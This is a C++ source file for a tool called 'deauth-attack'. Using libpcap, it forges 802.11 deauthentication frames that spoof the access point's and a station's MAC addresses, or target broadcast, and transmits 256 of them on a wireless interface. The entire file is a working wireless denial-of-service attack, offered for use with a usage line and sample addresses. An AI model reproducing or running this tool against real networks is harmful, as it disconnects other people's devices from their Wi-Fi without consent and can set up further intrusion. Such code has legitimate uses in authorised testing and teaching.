#include <pcap.h>
#include <stdio.h>
#include <cstring>
#include <string>
#include <stdlib.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include "main.h"
#include <map>
#include <unistd.h>



void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}


char* hex(u_int8_t *addr, char* buf, int size)
{

    for(int i=0;i<size;i++)
    {
        snprintf(buf+(3*i),size, "%02x",addr[i]);
        if(i!=size-1)
            snprintf(buf+2+(3*i),2,":");

    }

    return buf;

}





deauth_packet* getDeauthPacket(Mac srcMac,  Mac dstMac){

    deauth_packet* dpkt = (deauth_packet*)malloc(sizeof(deauth_packet));
    dpkt->rtap.header_revision = 0x0;
    dpkt->rtap.header_pad = 0x0;
    dpkt->rtap.header_length = 0x000c;
    dpkt->rtap.present_flags[0] = 0x00000000;
    dpkt->rtap.present_flags[1] = 0x00000000;


    dpkt->dot11_frame.frame_control_field.init(0xc000);
    dpkt->dot11_frame.duration = htons(0x3a01);
    dpkt->dot11_frame.mac1 = dstMac;
    dpkt->dot11_frame.mac2 = srcMac;
    dpkt->dot11_frame.mac3 = srcMac;
    dpkt->dot11_frame.fragment_number = 0b0;
    dpkt->dot11_frame.sequence_number = 0b0;

    dpkt->fixed_parameters[0] = 0x07;
    dpkt->fixed_parameters[1] = 0x00;

    char buf[512];
    printf("%s\n",hex((u_int8_t*)dpkt,buf, sizeof(deauth_packet) ) );

    return dpkt;
}


int main(int argc, char* argv[]) {

    Mac stationMac;
    if (argc == 3) {
        stationMac = Mac("ff:ff:ff:ff:ff:ff");

    }else if(argc == 4){

        stationMac = Mac(argv[3]);
    }
    else{
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];



    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", argv[1], errbuf);
        return -1;
    }

    deauth_packet *packet[2];
    packet[0] = getDeauthPacket(Mac(argv[2]), stationMac);
    if(argc ==3)
        packet[1] = getDeauthPacket(Mac(argv[2]), stationMac);
    else
        packet[1] = getDeauthPacket(stationMac, Mac(argv[2]));

    int res;


    for (int i =0; i<256; i++){
        usleep(100000);
        res = pcap_sendpacket(handle, reinterpret_cast<const u_int8_t*>(packet[i%2]), sizeof(deauth_packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("\n\n%dth Deauthentication Packet Sended.\n", i+1);
    }


    pcap_close(handle);

    free(packet[0]);
    free(packet[1]);





}
